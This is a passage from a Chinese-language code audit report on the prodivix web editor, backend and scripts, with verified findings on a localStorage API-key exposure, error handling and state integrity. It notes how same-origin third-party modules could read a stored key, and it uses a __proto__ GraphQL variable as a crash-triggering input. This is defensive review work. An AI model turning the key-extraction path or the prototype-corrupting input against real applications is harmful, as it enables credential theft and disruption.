**验证备注**: 证据与源码完全一致。apps/web/src/ai/aiSettingsStore.ts:19-22 通过 createJSONStorage(() => localStorage) 以 name 'prodivix-ai-settings' 持久化,且没有 partialize;zustand 的默认 partialize 是恒等函数,因此整个 `settings` 对象都会被 JSON 序列化。该机密确实位于这一结构中:packages/ai/src/settings/aiSettings.ts:13 在 ProdivixAiOpenAICompatibleSettings 上声明了 `apiKey?: string`。写入路径是真实的生产 UI,不是假想的直接调用:BlueprintAssistantSettingsModal.tsx:235-239 把一个输入框绑定到 draft.apiKey,toSettings(第 75 行)输出 `apiKey: draft.apiKey.trim() || undefined`,第 176 行直接经由 persist 中间件调用 setSettings(toSettings(draft))。`git grep partialize` 在全仓库只返回一处命中(auth store),因此没有任何守卫剥离它,也没有测试断言它不被持久化。有两条明文规定的不变量被违反:AGENTS.md:28(localStorage 只存放主题/选择/视图等 UI 偏好)和 AGENTS.md:34(机密值不得进入浏览器或客户端产物)。我检查过是否存在豁免:specs/implementation/llm-integration-foundation.md:184 认可无代理的本地优先 AI,但它只是实现计划,而同一文档第 169 行为 key 指定了 VSCode SecretStorage,说明 Web 表面只是缺少等价机制,而非被豁免。暴露路径是具体的而非推测的:packages/pir-react-renderer/src/host/iconRegistry.ts:487-492 会把未固定版本的 FontAwesome 模块从 esm.sh 动态导入编辑器源,因此第三方代码已经在同源执行,无需 XSS 就能用一次 localStorage.getItem 读到该 key。HTTP 子结论也已验证:normalizeBaseURL(packages/shared/src/safety/url.ts:1-7)只裁剪末尾斜杠、不检查协议,parseHttpUrl 只在 safety/embed.ts 中使用、从未用于 AI base URL,而弹窗校验(第 123 行)只检查非空,因此 http:// 的 base URL 确实会以明文发送 `Authorization: Bearer <key>`。审查者有一处推理瑕疵但不改变结论:与 useAuthStore 的对比是错的,因为它的 partialize(apps/web/src/auth/useAuthStore.ts:48-52)显式包含 `token`,因此同样把 bearer token 持久化到了 localStorage。严重性 medium 站得住脚且未被夸大:它需要同源脚本或本地浏览器配置文件访问权,而非远程攻击者,且只暴露用户自带的 key,没有多租户波及面;但在一个本就加载未固定远程模块的源上,以明文无限期静态持久化、且无需用户打开助手即可被提取,已经超出 low 的程度。

#### 4.3.3 错误处理(error-handling)

##### M-EH-01 已确认操作的副本写入遗漏了 settings,导致本地副本缺失时一次已提交的操作变成无界重试循环

- **位置**: [`apps/web/src/editor/workspaceSync/workspaceOutboxExecutor.ts:414`](apps/web/src/editor/workspaceSync/workspaceOutboxExecutor.ts#L414)
- **类别**: error-handling ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-store-sync`

**详情**: 在 Atomic Commit 成功之后,执行器调用 `replicaWriter` 时没有传 `settings` 字段。而只要不存在已有的副本行,`saveWorkspaceLocalReplica` 就要求提供 settings:当 `existing === null` 且 `input.settings === undefined` 时,它返回 `{ok:false, issues:[{path:'/settings', message:'A new local replica requires workspace settings.'}]}` 并抛出 `WorkspaceLocalReplicaRecordError`(indexedDbWorkspaceLocalReplicaStore.ts:364-387)。该异常被 `persistAcknowledgementFailure` 捕获,而后者无条件把失败标记为 `retryable: true`。第 258 行的 `already-applied` 分支存在同样的问题。由于无论 `attemptCount` 增长到多大,`retryWorkspaceOutboxEntry` 都不会升级为 `failed`(packages/workspace-sync/src/workspaceOutbox.ts:299-324,延迟上限为 60 秒),该条目会永远重试,即使服务器已经接受了该操作也永远不会把它从 outbox 中移除,而且它也永远不会在 Issues 中作为需要用户处理的失败出现。

**失败场景**: Editor.tsx 的初始 `saveWorkspaceLocalReplica` 失败(大型 workspace 上 IndexedDB 配额超限,或者部分写入的行发生解码错误)—— 该失败被 `console.warn('[workspace-replica] canonical snapshot was not cached')` 吞掉,编辑器随后基于远程 snapshot 打开。用户做了一次编辑;outbox 条目被创建,提交在服务端成功。此时 `replicaWriter` 因为不存在副本且没有提供 settings 而抛出异常,于是该条目被放回重试等待。之后每一次重试都会重新提交、得到 409、以 `already-applied` 方式恢复,然后再次在副本写入上失败 —— 形成一个 60 秒间隔的无限循环,不断重新冲击服务器,并且永远不让任何后续操作通过因果链头部。

**修复建议**: 把本地副本缺失视为对确认流程非致命的情况:让 `persistAcknowledgedWorkspaceLocalReplica` 回退到获取/创建副本(或者跳过该写入但仍然移除已确认的条目),而不是让整个确认过程失败。另外单独在 `persistAcknowledgementFailure` 中为重试设上限,使持续失败的本地写入升级为 `failed` 并出现在 Issues 中。

**验证备注**: 已端到端验证。workspaceOutboxExecutor.ts:414-418 与引用一致且遗漏了 `settings`。persistAcknowledgedWorkspaceLocalReplica(workspaceLocalReplica.ts:67-77)仅在 settings 有定义时才转发它,而 saveWorkspaceLocalReplica 在 existing===null 且 settings===undefined 时抛出 WorkspaceLocalReplicaRecordError(indexedDbWorkspaceLocalReplicaStore.ts:364-387);此外它还会在 388-394 处抛出,因为没有任何 outbox 写入方提供过 `project`,所以副本行缺失时确认写入必定失败。persistAcknowledgementFailure 无条件标记 retryable:true(167-191);retryWorkspaceOutboxEntry 没有尝试次数上限(packages/workspace-sync/src/workspaceOutbox.ts:299-324,DEFAULT 策略的 maximumDelayMs 为 60_000);selectWorkspaceOutboxClaimCandidate 只认领因果链头部,因此卡住的条目会阻塞所有后续操作。触发条件可达:Editor.tsx:340-361 用引用中那条完全一致的警告吞掉初始 saveWorkspaceLocalReplica 的失败,并仍以可编辑状态打开 workspace,而没有其他代码路径能创建该副本行。第 258 行的 already-applied 分支存在同样的缺陷。对该论断的一处更正:重试等待失败并非完全静默 —— useWorkspaceSaveIndicator.ts:121-132 会以警告语气把它呈现出来 —— 但 Issues 确实忽略重试等待(workspaceIssueProviders.ts:435-495 只处理 'failed' 和 'conflict')。中等严重度站得住:同步会永久停滞并每不超过 60 秒重新冲击一次服务器,但没有任何内容丢失(工作仍持久排队),而且如果 IndexedDB 故障是暂时的,重新加载即可自愈。

##### M-EH-02 被服务器拒绝的终端输入被丢弃,且没有任何用户可见的错误

- **位置**: [`apps/web/src/editor/features/execution/useRemoteExecutionTerminal.ts:328`](apps/web/src/editor/features/execution/useRemoteExecutionTerminal.ts#L328)
- **类别**: error-handling ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-execution`

**详情**: `ExecutionTerminalWriteResult.status` 可能是 `accepted`、`duplicate`、`out-of-order`、`stale`、`conflict`、`closed` 或 `rejected`(packages/runtime-remote/src/remoteExecutionTerminalCodec.ts:288-296)。`drainInputQueue` 把 `accepted`/`duplicate` 以外的每一种状态都当作静默丢弃处理:它弹出该条目、解析为 `false` 并 `continue`,完全不碰 `view.error`。该 hook 中其他所有失败路径(`send` 拒绝、传输抛错、resize 失败、输出解码失败)都会设置界面会渲染的 `view.error`。它还忽略了随 `out-of-order` 一起返回的 `expectedClientSequence`,因此在出现会导致失步的状态之后,本地的 `clientSequenceRef` 从不重新同步。

**失败场景**: 远端 PTY 在两次 250 毫秒轮询之间于服务端关闭(或 `requestInput` 抛错,产生 `rejected`)。用户输入 `npm test` 并回车。`send()` 把这些分块排队,`drainInputQueue` 将其写出,broker 对每一块都回答 `{status:'closed'}`(或 `{status:'rejected'}`)。每一块都被弹出并解析为 `false`;`view.phase` 保持 `open`,`view.error` 保持 `undefined`,因此模拟器依旧显示着已连接的光标。用户看到自己的按键凭空消失,没有任何消息,也没有任何迹象表明会话已经不在了,直到下一次 `read` 恰好报告 `closed` 为止。

**修复建议**: 按状态分支处理:对 `closed` 设置 `phase:'closed'`,对 `rejected`/`stale`/`conflict` 呈现一个 `input-*` 错误,对 `out-of-order` 在重试前重新同步 `clientSequenceRef.current = result.expectedClientSequence`,而不是静默地把队列排空。

**验证备注**: 引用的证据与 useRemoteExecutionTerminal.ts:328-334 完全吻合。我追踪了完整的呈现路径:ExecutionCenter.tsx:1148 接线 onInput={terminal.send},而 ExecutionTerminalEmulatorSurface.tsx:121 执行 `void onInput(data)` —— 布尔返回值被丢弃,因此 view.error(渲染于 ExecutionCenter.tsx:1151-1155)是唯一对用户可见的失败通道,而 drainInputQueue 对非 accepted/duplicate 状态从不设置它,这与该 hook 中其他所有失败路径(open-rejected、reconnect-rejected、transport-disconnected、input-pending、input-unacknowledged、resize-unacknowledged、output-invalid)形成对比。该失败在生产中可达,并非假设:remoteExecutionTerminalBroker.ts:229-247(以及 replicatedRemoteExecutionTerminalBrokerSupport.ts:179-201 中的复制变体)会从 enqueueCommand 抛出 RemoteExecutionTerminalBrokerError('quota-exceeded'),executionTerminalController.ts:310-317 把它转换成 {status:'rejected'},而 snapshot.status 仍然是 'open' —— 于是 250 毫秒的 `read` 轮询继续报告 phase 'open',用户完全得不到任何信号。`closed` 这一变体部分能自我纠正(refresh 会在一个轮询周期内把 phase 置为 'closed'),但 `rejected` 不会。该论断的后半部分同样正确,而且低估了影响:clientSequenceRef 只在 accepted/duplicate 时推进,而随 'out-of-order' 返回的 expectedClientSequence(解码于 remoteExecutionTerminalCodec.ts:305-314)从未被读取,因此在出现 'stale'(指纹被逐出、超过 maximumInputFingerprints)、'conflict' 或 'out-of-order'(当复制 broker 在工作节点故障转移时载入较旧的控制器 checkpoint 就会发生)之后,本地序号被钉死,之后的每一次按键都会以这个失效的序号重发并被永久静默丢弃。没有任何守卫、调用方检查或测试缓解这一点 —— 根本没有任何测试文件引用 useRemoteExecutionTerminal。

##### M-EH-03 当 CodeSlot 生命周期投影被阻塞时,代码文档删除失败放行,从而删除仍处于活动绑定的 artifact

- **位置**: [`apps/web/src/editor/features/code/CodeAuthoringWorkspace.tsx:1407`](apps/web/src/editor/features/code/CodeAuthoringWorkspace.tsx#L1407)
- **类别**: error-handling ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-code-anim-graph`

**详情**: `handleDeleteCodeFile` 只在 `lifecycleProjection.status === 'ready'` 时才强制执行"不能删除处于活动绑定的代码 artifact"这条规则。而 `projectWorkspaceCodeArtifactLifecycles`(packages/workspace/src/authoring/workspaceCodeArtifactLifecycle.ts:40-47)在 `createWorkspaceCodeSlotRegistryFromSnapshot` 被阻塞时(Semantic Index 组合被阻塞,或 `external-adapter` config 文档非法)也可能返回 `{status:'blocked'}`。在这种情况下 `lifecycle` 为 `undefined`,`lifecycle?.status === 'active'` 为 false,删除意图仍然会被派发。同一领域中可比的命令工厂是失败关闭的(`createWorkspaceOrphanCodeArtifactToModuleCommand` 在 `projection.status === 'blocked'` 时拒绝),因此这是在破坏性路径上一个不一致的、失败放行的守卫。第 1381 行的文件夹删除重复了同样的失败放行形态(`lifecycleProjection?.status === 'ready' && ...`)。此外,`createWorkspaceCodeSlotRegistryFromSnapshot` 会静默跳过任何解码失败的领域文档,因此单个非法的 `pir-graph`/`pir-animation`/PIR 文档也会让仅被该文档绑定的 artifact 看起来不是活动的。

**失败场景**: workspace 中含有 `code/scripts/onSubmit.ts`,它绑定到一个 Blueprint 的 `event-handler` CodeSlot(生命周期为 `active`),另外还有一个格式错误的 `external-adapter` config 文档(或任何解码失败的领域文档)。`projectWorkspaceCodeArtifactLifecycles` 返回 `{status:'blocked'}`;用户右键点击 `onSubmit.ts` -> Delete;守卫被跳过,`deleteWorkspaceCodeDocumentIntentRequest` 被派发,Blueprint 节点留下一个悬空的 `CodeReference`(COD-3001 "CodeSlot binding references a missing artifact"),而且没有显示任何警告。

**修复建议**: 改为失败关闭:只要 `lifecycleProjection` 缺失或 `status !== 'ready'`,就在文件与文件夹两个分支上都阻止删除(并给出明确消息),同时把投影问题呈现出来,而不是静默放行这个破坏性意图。

**验证备注**: 守卫在 CodeAuthoringWorkspace.tsx:1406-1414(文件删除)和 1380-1391(文件夹删除)处被逐字验证:活动绑定检查只在 lifecycleProjection.status === 'ready' 时才运行。lifecycleProjection 是一个无条件的 useMemo(第 440 行),删除入口仅受能力标志控制(第 1681 行的 onDelete 接线,第 850 行的 canDeleteCodeDocument),因此在投影被阻塞时没有任何机制隐藏这条破坏性路径。projectWorkspaceCodeArtifactLifecycles 会传播来自 createWorkspaceCodeSlotRegistryFromSnapshot 的 'blocked',而后者会被非法的 external-adapter config 或被阻塞的 Semantic Index 所阻塞,并且单个无法解码的 PIR/animation/nodegraph/token/data 文档就会阻塞该索引(createWorkspaceSemanticIndexFromSnapshot.ts 中的各个 collect* 辅助函数在 issues.length > 0 时都返回 blocked)。正如所述,它在组合 provider 时也会静默跳过无法解码的领域文档。下游不存在任何补偿检查:deleteWorkspaceCodeDocumentIntentRequest 只是一个普通信封(workspaceCommand.ts:1092),createWorkspaceVfsIntentCommandPlan(workspaceVfsIntent.ts:577-580)只执行结构性的 VFS 删除。createWorkspaceOrphanCodeArtifactToModuleCommand 确实是失败关闭的(workspaceCodeArtifactLifecycle.ts:135-141),因此这种不一致是真实存在的。严重度下调为 medium:由此产生的悬空绑定会以 COD-3001 呈现出来,而且该删除是一个可逆的 workspace 命令,因此这是一个失败放行的守卫,而非不可恢复的丢失。

##### M-EH-04 Workspace 提交被拒绝时 i18n 编辑被静默回退(没有 onError 处理器)

- **位置**: [`apps/web/src/editor/features/resources/I18nResourcePage.tsx:161`](apps/web/src/editor/features/resources/I18nResourcePage.tsx#L161)
- **类别**: error-handling ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-resources-issues`

**详情**: 构造 `createLatestResourceValuePersistenceController` 时没有传入 `onError` 回调。在 `latestResourceValuePersistence.ts:29-36` 中,被拒绝的 `persist` 会被捕获,然后从 Workspace 重新读取该值,`onValue` 把它推回 React state,而 `input.onError?.(error)` 因为没有提供处理器而是一个空操作。`persistI18nResourceValue` 在只读 Workspace 上会抛出异常(第 55-61 行),在任何被拒绝的操作上也会抛出(`if (outcome.status === 'rejected') throw new Error(outcome.message)`,第 76 行和第 93 行)。当 `workspaceReadonly` 为 true 时,没有任何一个 i18n 输入控件被禁用,因此编辑会被接受、短暂渲染,然后被静默回退。

**失败场景**: 用户打开一个只读 Workspace(或提交因 revision 漂移被拒绝的 Workspace),在 i18n 表格中编辑某个翻译值并看到新文本出现。控制器的 `persist` 抛出 `This Workspace is read-only.`,catch 分支重新读取 Workspace 中的值并调用 `onValue`,于是单元格弹回旧字符串,没有任何 toast、提示或控制台输出。同样的机制会静默丢弃在一次提交进行中所做的一批编辑。

**修复建议**: 传入一个 `onError`,把错误消息呈现在页面中(状态/提示区域),并在 `useEditorStore(state => state.workspaceReadonly)` 为 true 时禁用 i18n 编辑控件。

**验证备注**: 已核实。I18nResourcePage.tsx:161-171 构造控制器时只传入了 `initialValue`/`persist`/`readExternal`/`onValue`,没有 `onError`。latestResourceValuePersistence.ts:30-36 捕获被拒绝的 `persist`,清除 `pending`,通过 `readExternal()` 重新读取,把陈旧的值经由 `onValue`(setResourceValue)推回,然后调用 `input.onError?.(error)`——在这里是空操作——并且从不重新抛出,因此该拒绝被完全吞掉。`persistI18nResourceValue` 确实在结论所指的两条路径上抛出:第 55-61 行针对 `editor.workspaceReadonly`/无 workspace,第 76 行和第 93 行针对 `outcome.status === 'rejected'`。我用 grep 检查了 I18nResourcePage.tsx 和 I18nResourcePanels.tsx:`workspaceReadonly` 只在 `persistI18nResourceValue` 内部被读取,从未用于禁用输入控件,而且该页面完全没有错误/toast 状态(其余仅有的 `Error`/`TypeError` 用法是 JSON 导入的校验器)。`workspaceReadonly` 在生产环境中确实可达(由 Editor.tsx:255 的只读缓存路径设置)。所以一次编辑会被接受、渲染,然后被静默回退。严重级别已修正:canonical Workspace 保持正确,UI 会重新同步到真实状态——这是一个缺少反馈/丢失未保存编辑的缺陷,而非数据损坏,因此 'high' 属于夸大。

##### M-EH-05 GraphQL 导入器未保护 normalizeDataSourceDocument,非 canonical 的投影会抛出异常而不是返回被阻塞的提案

- **位置**: [`packages/data-graphql/src/dataGraphqlImporter.ts:898`](packages/data-graphql/src/dataGraphqlImporter.ts#L898)
- **类别**: error-handling ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-data`

**详情**: `createDataGraphqlImportProposal` 在第 898 行(新导入)和第 1212 行(重新导入)调用 `normalizeDataSourceDocument`,均未加 try/catch。只要投影出的文档违反 canonical 契约,`normalizeDataSourceDocument` 就会抛出 `TypeError`。同族的 OpenAPI 导入器对两个等价调用点都做了包裹(第 1703-1746 行和 2046-2074 行),并把失败转换为 `blocked('invalid', …)`。有几个由导入器控制的字段在投影前从未被校验:`entry.name` 和 `entry.description` 被原样复制进 `DataOperation.name`/`description`(第 697-698 行),而 `properties` 可能被一个名为 `__proto__` 的 GraphQL 变量在结构上破坏。声明的返回类型 `DataGraphqlImportProposal` 承诺返回被阻塞的提案,因此调用方没有理由预期会出现异常。

**失败场景**: 以一份合法的 SDL 和 `bundle.operations[0] = { document: 'query GetUser { user { id } }', name: 'Get User ' }`(尾部有空格,例如从 UI 字段粘贴而来)调用 `createDataGraphqlImportProposal`。`parseOperations`/`readOptionalCanonicalString` 拒绝这个未去空白的名称,`normalizeDataSourceDocument` 抛出 `TypeError: Invalid data source document: /operationsById/get-user/name: …`,该异常从 `createDataGraphqlImportProposal` 逃逸,而不是产出带 issues 的 `status:'invalid'`。`query Q($__proto__: String) { user { id } }` 会导致同样的崩溃,它会破坏所生成 `properties` 记录的原型。

**修复建议**: 完全照 `dataOpenApiImporter.ts` 的做法,用 try/catch 包裹两处 `normalizeDataSourceDocument` 调用,追加一条 `invalidDocument` issue 并返回 `blocked('invalid', target, issues, changes, schemaImpact, operationImpact)`;此外在投影之前用现有的 `canonical()` 辅助函数校验 `entry.name`/`entry.description`。

**验证备注**: 已通过 grep 和实际执行核实。packages/data-graphql/src/dataGraphqlImporter.ts 在第 898 行(新导入)和第 1212 行(重新导入)无保护地调用 normalizeDataSourceDocument;只有第 847 行的 currentDocument 调用被包裹。同族的 packages/data-http/src/dataOpenApiImporter.ts 在 1703-1731 和 2046-2059 处包裹了等价调用,并把失败转换为 blocked('invalid', ...)。`entry.name` 在第 697 行被原样复制进 DataOperation.name 且从未校验(DataGraphqlImportOperation.name 只是 `string?`,第 68 行)。审查者给出的三个触发条件我全部复现,每一个都以未捕获的 TypeError 逃逸而非返回提案:name 为 'Get User ' -> 'Invalid data source document: /operationsById/getuser/name: Expected a non-empty canonical string without surrounding whitespace or null bytes.';name 为 '' -> 同上;`query Q($__proto__: String)` -> 'Invalid data source document: /schemasById/q-input/schema/properties: JSON objects must be plain object records.'。基线 bundle 返回 status 'ready',因此崩溃可归因于这些未校验字段。严重性由 high 修正为 medium:声明的返回类型确实承诺返回被阻塞的提案,但 `git grep` 显示仓库内没有 createDataGraphqlImportProposal 的生产调用方(只有包 index 的重新导出及其自身测试),这与拥有 apps/web 导入会话的 OpenAPI 导入器不同。

##### M-EH-06 AsyncAPI 导入器未保护 normalizeDataSourceDocument,带空白的操作键会导致导入崩溃

- **位置**: [`packages/data-asyncapi/src/dataAsyncApiImporter.ts:885`](packages/data-asyncapi/src/dataAsyncApiImporter.ts#L885)
- **类别**: error-handling ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-data`

**详情**: 与 GraphQL 导入器是同一处缺陷:`createDataAsyncApiImportProposal` 在第 885 行(新导入)和第 1194 行(重新导入)无保护地调用 `normalizeDataSourceDocument`,而 OpenAPI 导入器对两处都做了包裹。AsyncAPI 投影直接从未经校验的规范键推导 canonical 字符串:`inputSchema.name` 为 `` `${operationId} message` ``(第 608 行),`outputSchema.name` 为 `` `${operationId} reply` ``(第 613 行),而 `DataOperation.name` 回退为原始的 `operationId`(第 669 行)—— `operationId` 是规范中 `operations` 记录的不可信键,从未用该文件自身的 `canonical()` 辅助函数检查过。

**失败场景**: 导入一份 AsyncAPI 3.0 文档,其 operations 映射中有一个以空格开头的键,例如 `"operations": { " sendUser": { "action": "send", "channel": { "$ref": "#/channels/c" } } }`。投影出的 schema 名称为 `' sendUser message'`,操作名称为 `' sendUser'`;`readOptionalCanonicalString` 拒绝二者,`normalizeDataSourceDocument` 抛出未捕获的 `TypeError: Invalid data source document: …` 并从 `createDataAsyncApiImportProposal` 逃逸,而不是返回带 issues 的 `status:'invalid'`。

**修复建议**: 用 try/catch 包裹两处调用,并返回带 `invalidDocument` issue 的 `blocked('invalid', …)`;同时在据 `operationId` 推导 schema/操作名称之前,用现有的 `canonical()` 判定对其做校验。

**验证备注**: 已通过 grep 和实际执行核实。packages/data-asyncapi/src/dataAsyncApiImporter.ts 在第 885 行和第 1194 行无保护地调用 normalizeDataSourceDocument;只有第 831 行的 currentDocument 调用被包裹。`operationId` 直接来自 `Object.keys(operationsRecord)`(第 530 行),并被未经检查地用于 `${operationId} message`(608)、`${operationId} reply`/`receipt`(613),以及作为 DataOperation.name 的回退值(669)—— 该文件自身的 `canonical()` 辅助函数被应用于 operation.title/summary,却从未应用于 operationId。已精确复现该场景:一份 operations 键为 ' sendUser' 的 AsyncAPI 3.0 规范会让 createDataAsyncApiImportProposal 抛出 `TypeError: Invalid data source document: /schemasById/senduser-input/name: ...; /schemasById/senduser-output/name: ...; /operationsById/senduser/name: Expected a non-empty canonical string without surrounding whitespace or null bytes.`。同一份规范把键改为 'sendUser' 则返回 status 'ready',从而隔离出原因。严重性由 high 修正为 medium,理由与 GraphQL 导入器相同:仓库内目前没有 createDataAsyncApiImportProposal 的生产调用方(只有包 index 的重新导出及其自身测试)。

##### M-EH-07 start-dev-postgres.ps1 恰好在数据库不存在时对 null 的 psql 结果调用 .Trim(),因此 createdb 永远不会执行

- **位置**: [`scripts/start-dev-postgres.ps1:77`](scripts/start-dev-postgres.ps1#L77)
- **类别**: error-handling ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-cli-vscode-scripts`

**详情**: 当 SELECT 返回零行时,`psql -tA` 完全不输出 stdout,于是 PowerShell 给 `$databaseExists` 赋值 `$null`。`$LASTEXITCODE` 为 0(查询本身成功),所以第 73 行的守卫通过,接着第 77 行对 `$null` 调用 `.Trim()`。由于第 1 行设置了 `$ErrorActionPreference = 'Stop'`,该 RuntimeException 会在到达 `createdb` 之前终止脚本。而零行恰恰是这个分支本来要处理的情况。

**失败场景**: 开发者首次运行 `scripts/start-dev.bat`(或直接运行该 ps1)。`initdb` 创建的集群只包含 postgres/template0/template1。存在性查询返回 0 行 -> psql 不输出 stdout -> `$databaseExists` 为 `$null` -> `$null.Trim()` 抛出 "You cannot call a method on a null-valued expression" -> 脚本中止。`prodivix` 数据库从未被创建,随后 `pnpm dev:backend` 无法连接。

**修复建议**: 先做规范化,例如在与 '1' 比较之前使用 `$databaseExists = ($databaseExists | Out-String).Trim()`(或 `"$databaseExists".Trim()`)。

**验证备注**: 证据与文件完全一致(第 72-77 行),且第 1 行设置了 $ErrorActionPreference='Stop'。我在 pwsh 7 中复现了该语义:捕获一个不输出 stdout 的原生命令会赋值 $null($null -eq $out 返回 True),而在 `if` 条件中求值 `$v.Trim()` 会抛出 System.Management.Automation.RuntimeException 'You cannot call a method on a null-valued expression'。在 'Stop' 下以 -File 方式运行该脚本会以退出码 1 中止 —— 分支体和后续语句都没有执行。`psql -tA` 会抑制 '(0 rows)' 尾注,因此数据库缺失时 stdout 为空且退出码为 0,顺利通过第 73 行的守卫。所以 createdb 恰恰在它本应处理的情况下不可达;scripts/start-dev.bat:29 会在首次搭建时启动该脚本。严重性由 high 下调为 medium:这只涉及本地 Windows 开发数据库的引导工具,失败时会带行号显式报错,不影响任何数据或生产路径。

#### 4.3.4 状态完整性(state-integrity)

##### M-SI-01 每次 Workspace snapshot 变化都会静默丢弃 Data 手工编辑草稿

- **位置**: [`apps/web/src/editor/features/resources/DataManualAuthoringPanel.tsx:113`](apps/web/src/editor/features/resources/DataManualAuthoringPanel.tsx#L113)
- **类别**: state-integrity ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-resources-issues`

**详情**: `selected` 是 `useMemo(..., [documentId, workspace])`,并返回一个新鲜 `Object.freeze` 过的对象,因此只要 Workspace snapshot 对象发生变化,它的标识就会变化 —— 而不仅仅是在所选 Data 文档变化时。`schemaIds`/`operationIds` 基于 `[selected]` 做记忆化,因此它们也会获得新标识。第 77-113 行的 effect 把这三者全部列入依赖数组,并无条件调用 `setDraft(...)`(以及 `setSchemaTarget`/`setSchemaId`),覆盖掉用户输入的任何 JSON。同类的 `DesignTokenResourcePage` 通过把重置 effect 的依赖设为 `selectedDocument?.content` / `contentRev` / `id` 而不是整个 snapshot 来避免这一点。

**失败场景**: 用户打开 Resources → Data,在手工编辑文本框中输入了 60 行 JSON Schema,然后修改了任意一项全局设置(主题/密度/撤销步数)。`SettingsEffects` 提交 Workspace 设置,`adoptWorkspaceSettingsOutboxResult` 调用 `editor.applyWorkspaceMutation(result.mutation)`(apps/web/src/editor/workspaceSync/workspaceSettingsOutboxAdoption.ts:28),产生一个新的 `workspace` 对象。该面板的 effect 重新运行,把文本框内容替换成已持久化的 schema;输入的草稿丢失,且没有任何警告。任何被采纳的远程 mutation 或 outbox 确认都会导致同样的结果。

**修复建议**: 把重置 effect 的依赖改为稳定的标量(`documentId`、`operationId`、`selected.workspaceDocument.contentRev`、`mode`),而不是从整个 snapshot 派生出来的记忆化对象;并且在草稿相对上次加载的基线为脏时跳过重置。

**验证备注**: 已逐行验证。DataManualAuthoringPanel.tsx:54-66 基于 `[documentId, workspace]` 记忆化 `selected` 并返回一个新鲜的 `Object.freeze({...})`,因此只要 Workspace snapshot 对象变化其标识就会变化,而不只是所选数据源文档变化时。第 68-75 行从 `[selected]` 派生出 `schemaIds`/`operationIds`,因此它们也会获得新的数组标识。第 77-113 行的 effect 列出了 `[mode, operationId, operationIds, schemaIds, selected]` 并无条件调用 `setDraft(...)`/`setSchemaTarget`/`setSchemaId`/`setPreview(undefined)` —— 没有任何与当前草稿比较的守卫。重新渲染的触发条件是真实的:`useEditorStore((state) => state.workspace)` 使用引用相等性,而 editorStore.workspaceSlice.ts:329-349 的 `applyWorkspaceMutation` 总是通过 `applyCanonicalWorkspaceMutation` 返回一个新的 `workspace` 对象,这正是 workspaceSettingsOutboxAdoption.ts:28 在设置提交被确认时所调用的。该面板在生产中已挂载(DataResourcePage.tsx:169),而 DesignTokenResourcePage.tsx:102-103 中的对照模式(依赖 `selectedDocument?.content` / `contentRev`)印证了预期的写法。严重度更正:这会丢失未保存的文本框输入并清除预览;它不会破坏 Canonical Workspace,也不会持久化错误内容,因此是 UX/状态 bug,而不是 high。

##### M-SI-02 Workspace 导入跳过了 data-source 交叉引用校验,使客户端可以持久化一份永久阻塞后续所有 Atomic Commit 的文档

- **位置**: [`apps/backend/internal/modules/workspace/store_helpers.go:340`](apps/backend/internal/modules/workspace/store_helpers.go#L340)
- **类别**: state-integrity ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-workspace`

**详情**: `validateWorkspaceDocumentContent` 把所属文档 id 作为可变参数接收,对于 `data-source` 文档会将其转发给 `validateDataSourceDocument(payload, documentID)`。当该 id 为空时,`validateDataOperationRelations` 会短路并且什么都不校验(data_source_validator.go:204-207)。导入路径(`normalizeWorkspaceDocumentContent`,store_helpers.go:340,由 store_snapshot.go:84 调用)在调用校验器时**不**传入该 id,因此同文档内的 `policies.optimistic.target` 不变量在导入时从未被检查。相反,每一条提交路径都会传入该 id:`workspaceCommitState.validate()`(operation_commit_apply.go:477)会重新校验 workspace 中的所有文档,而 `CommitWorkspaceOperation` 会在应用之前先对 pre-apply 状态运行该校验(store_operation_commit.go:85-87)。因此,导入接受的一份文档会让此后的每一次提交都失败。

**失败场景**: 向 POST /api/workspaces/import-local-project 提交一份 `data-source` 文档,其 id 为 `doc_data`,内容中包含 `operationsById.m1.policies.optimistic.target = {"documentId":"doc_data","operationId":"m2"}`,而 `m2` 并不存在(或存在但 `kind:"mutation"`)。由于 documentID 为 "",导入成功(HTTP 201)。从此以后,对该 workspace 的**每一次** POST /api/workspaces/{id}/operations/commit——包括只涉及完全无关文档的提交——都会在 store_operation_commit.go:85 处以 422 `COMMIT_VALIDATION_FAILED` 失败,路径为 `/workspace`(`.../operationId references unknown same-document operation "m2"`)。该 workspace 可读但永久不可写,并且没有任何 API 可以修复它。

**修复建议**: 修改 `normalizeWorkspaceDocumentContent` 以接收文档 id 并转发:`normalizeWorkspaceDocumentContent(documentType, document.ID, document.Content)` -> `validateWorkspaceDocumentContent(documentType, normalized, documentID)`。更好的做法是去掉可变参数,把 id 变为必填参数,这样任何调用点都无法静默跳过按身份作用域的校验。

**验证备注**: 无法证伪。所引用的每一行都准确无误:store_helpers.go:340 调用 validateWorkspaceDocumentContent(documentType, normalized) 时没有传入可变参数 id;第 375 行的签名把 documentID 默认为 "";data_source_validator.go:204-207 在 id 为空时返回 nil;validateDataSourceDocument:87 把同文档 optimistic-target 检查完全交由 validateDataOperationRelations 处理。我还检查了是否存在替代守卫:validateDataOptimisticPolicy(data_source_policy_validator.go:368-402)只是把 target.documentId/target.operationId 解码为规范字符串,从不检查目标操作是否存在或其 kind 是否为 "query",因此没有别的机制覆盖这一点。可达性端到端成立:handlers.go:147/196 把客户端提供的 request.Workspace.Documents 直接传入 importPreparedProjectWorkspace,store_snapshot.go:69 接受任意客户端 id(vfs_tree.go:226-228 的 isCanonicalWorkspaceVFSID 只要求非空且已去除空白),而 store_snapshot.go:84 是 normalizeWorkspaceDocumentContent 唯一的非测试调用方。这一不对称是真实存在的:store_operation_commit.go:85-87 对 pre-apply 状态运行 state.validate(),operation_commit_apply.go:477 对**每一份**文档都传入 document.ID,因此导入接受的一份文档会让此后的每一次操作提交在 apply 之前就返回 422——包括删除该文档的提交。严重级别由 high 修正为 